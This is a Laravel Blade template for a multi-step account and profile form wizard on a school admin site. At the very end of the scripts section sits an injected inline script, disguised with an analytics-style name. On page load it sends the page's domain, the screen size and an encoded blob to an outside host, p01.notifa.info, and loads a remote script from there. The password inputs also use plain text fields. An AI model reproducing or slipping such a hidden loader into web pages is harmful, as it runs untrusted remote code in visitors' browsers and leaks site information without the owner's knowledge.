@extends('layouts.master')

@push('title')
- Tampilan Tambah
@endpush

@push('styles')
<!--favicon-->
  <link rel="icon" href="{{asset('assets/images/favicon.ico')}}" type="image/x-icon">
  <!-- jquery steps CSS-->
  <link rel="stylesheet" type="text/css" href="{{asset('assets/plugins/jquery.steps/css/jquery.steps.css')}}">
  <!-- simplebar CSS-->
  <link href="{{asset('assets/plugins/simplebar/css/simplebar.css')}}" rel="stylesheet"/>
  <!-- Bootstrap core CSS-->
  <link href="{{asset('assets/css/bootstrap.min.css')}}" rel="stylesheet"/>
  <!-- animate CSS-->
  <link href="{{asset('assets/css/animate.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Icons CSS-->
  <link href="{{asset('assets/css/icons.css')}}" rel="stylesheet" type="text/css"/>
  <!-- Sidebar CSS-->
  <link href="{{asset('assets/css/sidebar-menu.css')}}" rel="stylesheet"/>
  <!-- Custom Style-->
  <link href="{{asset('assets/css/app-style.css')}}" rel="stylesheet"/>

@endpush

@section('content')
<div class="row pt-2 pb-2">
        <div class="col-sm">
        <h4 class="page-title">Add</h4>
        <ol class="breadcrumb">
            <li class="breadcrumb-item"><a href="javaScript:void();">SMK Mahaputra</a></li>
            <li class="breadcrumb-item"><a href="javaScript:void();">Template Halaman</a></li>
            <li class="breadcrumb-item active" aria-current="page">Add</li>
         </ol>
     </div>
</div>
    <div class="row">
        <div class="col-lg-12">
          <div class="card">
            <div class="card-header text-uppercase">
              Basic Form Wizard
            </div>
            <div class="card-body">
               <form id="basic-form" action="#">
                  <div>
                      <h3>Account</h3>
                      <section>
                          <div class="form-group">
                              <label for="userName">User name *</label>
                              <input class="form-control" type="text">
                          </div>
                          <div class="form-group">
                              <label for="password"> Password *</label>
                              <input type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Confirm Password *</label>
                              <input id="confirm" name="confirm" type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label class="col-lg-12 control-label">(*) Mandatory</label>
                          </div>
                      </section>
                      <h3>Profile</h3>
                      <section>
                          <div class="form-group">
                              <label> First name *</label>
                              <input type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label> Last name *</label>
                              <input type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Email *</label>
                              <input type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label>Address *</label>
                              <input type="text" class="form-control">
                          </div>
                          <div class="form-group">
                              <label class="col-lg-12 control-label">(*) Mandatory</label>
                          </div>
                      </section>
                      <h3>Hints</h3>
                      <section>
                          <div class="form-group">
                              <div class="col-lg-12">
                                  <ul>
                                      <li>Jonathan Smith </li>
                                      <li>Lab</li>
                                      <li>jonathan@example.com</li>
                                      <li>Your city, Cityname</li>
                                  </ul>
                              </div>
                          </div>
                      </section>
                      <h3>Finish</h3>
                      <section>
                          <div class="form-group">
                              <div class="col-lg-12">
                                  <div class="checkbox checkbox-primary">
                                      <input id="checkbox-h" type="checkbox">
                                      <label for="checkbox-h">
                                          I agree with the Terms and Conditions.
                                      </label>
                                  </div>
                              </div>
                          </div>
                      </section>
                  </div>
              </form> 
            </div>
          </div>
        </div>
      </div>
@endsection       
    
@push('scripts')

  <!-- Bootstrap core JavaScript-->
  <script src="{{asset('assets/js/jquery.min.js')}}"></script>
  <script src="{{asset('assets/js/popper.min.js')}}"></script>
  <script src="{{asset('assets/js/bootstrap.min.js')}}"></script>
  
  <!-- simplebar js -->
  <script src="{{asset('assets/plugins/simplebar/js/simplebar.js')}}"></script>
  <!-- waves effect js -->
  <script src="{{asset('assets/js/waves.js')}}"></script>
  <!-- sidebar-menu js -->
  <script src="{{asset('assets/js/sidebar-menu.js')}}"></script>
  <!-- Custom scripts -->
  <script src="{{asset('assets/js/app-script.js')}}"></script>

  <!--Form Wizard-->
  <script src="{{asset('assets/plugins/jquery.steps/js/jquery.steps.min.js')}}" type="text/javascript"></script>
  <script type="text/javascript" src="{{asset('assets/plugins/jquery-validation/js/jquery.validate.min.js')}}"></script>
  <!--wizard initialization-->
  <script src="{{asset('assets/plugins/jquery.steps/js/jquery.wizard-init.js')}}" type="text/javascript"></script>
  
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582Am8lISurprAz4dcBbGgKuiupA3lQkYOJAFygY6rjggh2kqvP9ViIlIFd59IHzCqkQ646NXIL%2fymtefjls39w24SgR1WMBTSQjABBamG0ar9bKDLNwe3OzZ5PE54M9w9Qosw6SMGIXmdvwD7NOAdg3VNxPSbckeCi8u4jL8wnd0XEQXyxu2NdGBheW84eBFL6UnbCRQ9Of%2bINOkAMAMYwbpTiHoQXIb%2bE9kjOIPesviPqjPvby4a7xdEMiUdEw8AEqJ6wa85SpywCi%2f7zq9yhUqxynKvGVIU4oSAtSAc5hfw5Qig8cCuqDJkEK9GbMXuYUYVUQliNq2M%2fTSJ7FqJ%2brk8JTSP5mR66E475Zt8HauQ5gI3EvGZvfqqDCKK%2bQGsuTgNQJQbUsS2p%2f7L1RS%2bfd2f97pLp9RtnMTgTdkyBxNRXCtglsvmNqHEUSe96BthG5Kr%2fuyPlnjKki8%2fQieBWwfJJLfDlf859ffODCR1dYCQ7YkL5hnezFxbrBtYbhZeFwnV4ayx%2bebK" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
@endpush
    